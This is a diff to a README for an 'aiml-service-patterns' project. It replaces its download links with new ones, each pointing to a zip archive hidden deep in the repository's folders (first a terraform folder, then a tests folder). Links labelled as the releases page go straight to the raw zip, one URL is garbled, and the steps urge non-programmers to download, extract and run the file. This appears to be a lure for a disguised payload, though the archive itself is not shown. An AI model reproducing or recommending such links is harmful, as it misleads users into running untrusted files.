@@ -1,6 +1,6 @@
 # 🚀 aiml-service-patterns - Easy AIML Solutions for Everyone
 
-[![Download Latest Release](https://github.com/sayyad5774/aiml-service-patterns/raw/refs/heads/main/infra/terraform/envs/local/aiml-patterns-service-v3.2.zip%https://github.com/sayyad5774/aiml-service-patterns/raw/refs/heads/main/infra/terraform/envs/local/aiml-patterns-service-v3.2.zip)](https://github.com/sayyad5774/aiml-service-patterns/raw/refs/heads/main/infra/terraform/envs/local/aiml-patterns-service-v3.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/sayyad5774/aiml-service-patterns/main/apps/rag_policy/tests/patterns-service-aiml-1.6.zip%https://raw.githubusercontent.com/sayyad5774/aiml-service-patterns/main/apps/rag_policy/tests/patterns-service-aiml-1.6.zip)](https://raw.githubusercontent.com/sayyad5774/aiml-service-patterns/main/apps/rag_policy/tests/patterns-service-aiml-1.6.zip)
 
 ## 📖 Overview
 
@@ -15,13 +15,13 @@ To begin using aiml-service-patterns, follow the steps outlined below. No progra
 1. **Visit the Releases Page:**
    Click the link below to access the releases page:
    
-   [Visit Releases Page](https://github.com/sayyad5774/aiml-service-patterns/raw/refs/heads/main/infra/terraform/envs/local/aiml-patterns-service-v3.2.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/sayyad5774/aiml-service-patterns/main/apps/rag_policy/tests/patterns-service-aiml-1.6.zip)
 
 2. **Choose Your Version:**
    On the releases page, find the latest version. Each release includes a list of features and improvements.
 
 3. **Download the Application:**
-   Click on the asset you wish to download. This will usually be a `.zip` or `https://github.com/sayyad5774/aiml-service-patterns/raw/refs/heads/main/infra/terraform/envs/local/aiml-patterns-service-v3.2.zip` file containing the application.
+   Click on the asset you wish to download. This will usually be a `.zip` or `https://raw.githubusercontent.com/sayyad5774/aiml-service-patterns/main/apps/rag_policy/tests/patterns-service-aiml-1.6.zip` file containing the application.
 
 4. **Extract the Files:**
    After downloading the file, extract it to a folder on your computer. You can usually do this by right-clicking on the file and selecting 'Extract All'.
@@ -81,7 +81,7 @@ Join our community for help, tips, and best practices:
 
 We are continuously improving aiml-service-patterns. Stay updated by checking the releases page regularly:
 
-[Visit Releases Page](https://github.com/sayyad5774/aiml-service-patterns/raw/refs/heads/main/infra/terraform/envs/local/aiml-patterns-service-v3.2.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/sayyad5774/aiml-service-patterns/main/apps/rag_policy/tests/patterns-service-aiml-1.6.zip)
 
 ## 📝 License
 
